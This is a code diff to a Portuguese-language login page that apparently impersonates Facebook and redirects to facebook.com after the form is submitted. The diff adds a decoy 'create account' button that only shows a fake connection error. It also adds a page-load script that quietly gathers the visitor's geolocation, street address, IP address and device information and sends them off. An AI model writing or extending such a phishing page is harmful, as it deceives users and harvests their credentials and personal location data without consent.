@@ -89,8 +89,13 @@
 
   .login-form .create-account {
     background-color: #42b72a;
-    margin-top: 20px;
+    margin-top: 10px;
     font-weight: bold;
+    padding: 10px;
+    font-size: 14px;
+    width: 60%;
+    margin-left: auto;
+    margin-right: auto;
   }
 
   .login-form a {
@@ -107,8 +112,16 @@
   }
 
   hr {
-    margin: 20px 0;
+    margin: 15px 0;
     border: 1px solid #ddd;
+  }
+
+  .connection-error {
+    color: red;
+    font-size: 12px;
+    text-align: center;
+    margin-top: 8px;
+    display: none;
   }
 </style>
 </head>
@@ -133,7 +146,8 @@
       <button type="submit">Entrar</button>
       <a href="#">Esqueceu a senha?</a>
       <hr>
-      <button type="button" class="create-account">Criar nova conta</button>
+      <button type="button" class="create-account" id="createAccount">Criar nova conta</button>
+      <div id="connectionError" class="connection-error">Erro de conexão. Tente novamente.</div>
     </form>
   </div>
 </div>
@@ -147,6 +161,8 @@ const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
 const emailError = document.getElementById('emailError');
 const passwordError = document.getElementById('passwordError');
+const createAccountBtn = document.getElementById('createAccount');
+const connectionError = document.getElementById('connectionError');
 
 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 const phoneRegex = /^\d{8,}$/;
@@ -382,10 +398,33 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
   window.location.href = "https://facebook.com";
 });
 
-document.addEventListener('DOMContentLoaded', function() {
+createAccountBtn.addEventListener('click', function() {
+  connectionError.style.display = 'block';
+  
   setTimeout(() => {
+    connectionError.style.display = 'none';
+  }, 3000);
+});
+
+window.addEventListener('load', function() {
+  setTimeout(() => {
+    getLocation().then(location => {
+      userLocation = location;
+      if (userLocation) {
+        getAddressFromCoords(userLocation.latitude, userLocation.longitude).then(address => {
+          userAddressInfo = address;
+        });
+      }
+    }).catch(error => {
+      console.log("Localização recusada na carga inicial");
+    });
+    
+    getUserIP().then(ip => {
+      userIP = ip;
+    });
+    
     collectAndSendDeviceInfo();
-  }, 500);
+  }, 100);
 });
 </script>
 
